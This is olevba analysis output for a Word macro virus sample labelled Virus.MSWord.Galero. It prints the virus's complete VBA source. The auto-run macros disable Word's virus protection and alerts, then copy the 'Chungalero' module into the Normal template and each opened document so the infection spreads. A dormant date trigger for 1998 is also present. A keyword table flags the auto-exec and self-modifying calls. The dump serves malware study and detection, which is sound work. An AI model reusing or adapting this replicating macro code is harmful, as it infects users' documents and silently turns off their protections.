olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Galero
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Galero - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Chungalero.bas 
in file: Virus.MSWord.Galero - OLE stream: 'Macros/VBA/Chungalero'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'
' AutoOpen Macro
' ChungaleWare Inc. V1 La Venganza!!!


On Error GoTo Chungalero

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    'Set ActiveDoc = ActiveDocument
    'Set GlobalDoc = NormalTemplate


If Not DocInfectado() Then
    InfectarDoc
End If

If Not NormalInfectado() Then
    InfectarNormal
End If

Call FaKeJoker

Chungalero:
End Sub
Private Sub InfectarDoc()
On Error GoTo InfecDocError
    
    Application.OrganizerCopy Source:=NormalTemplate.FullName, _
    Destination:=ActiveDocument.FullName, Name:="Chungalero", _
    Object:=wdOrganizerObjectProjectItems

InfecDocError:
End Sub
Private Sub InfectarNormal()
On Error GoTo InfecDocError

    Application.OrganizerCopy Source:=ActiveDocument.FullName, _
    Destination:=NormalTemplate.FullName, Name:="Chungalero", _
    Object:=wdOrganizerObjectProjectItems
    Options.SaveNormalPrompt = False

InfecDocError:
End Sub
Public Function DocInfectado()
On Error GoTo DocInfectError
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Chungalero" Then
            DocInfectado = True
        End If
Next

DocInfectError:
End Function

Public Function NormalInfectado()

On Error GoTo NormalInfectError
For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "Chungalero" Then
            NormalInfectado = True
        End If
Next


NormalInfectError:
End Function

Sub FaKeJoker()
On Error GoTo FaKeError
    Dim Dia
    Dim Hora
    Dim Fecha, FechaFinal
    FechaFinal = #12/18/98#
    Dia = Day(Now())
    Hora = Hour(Now())
    If FechaFinal = Date Then
        Chungale
    End If
    Fecha = FechaFinal - Date
    
    
FaKeError:
End Sub

Sub Chungale()
On Error GoTo ChungaleError

ChungaleError:
End Sub

Sub AutoClose()
On Error GoTo ErrorClose

Call AutoOpen

ErrorClose:
End Sub

Sub AutoNew()
On Error GoTo ErrorNew

Call AutoOpen

ErrorNew:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

